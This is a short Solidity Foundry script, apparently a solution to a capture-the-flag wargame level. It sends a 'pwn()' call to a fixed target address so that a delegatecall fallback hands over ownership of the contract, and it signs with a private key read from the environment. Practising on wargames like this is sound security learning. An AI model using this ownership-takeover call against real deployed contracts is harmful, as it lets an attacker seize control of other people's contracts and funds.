// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";

interface IDelegation {
    function owner() external view returns(address);
}

contract DeployDelegation is Script {
    address constant public TARGET_ADDRESS = 0x20556d474CCb3d5CA2Ab7BA2170F097718cf5d35;

    function run() public {
        bytes memory sig = abi.encodeWithSignature("pwn()");
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address(IDelegation(TARGET_ADDRESS)).call(sig);
        vm.stopBroadcast();
    }
}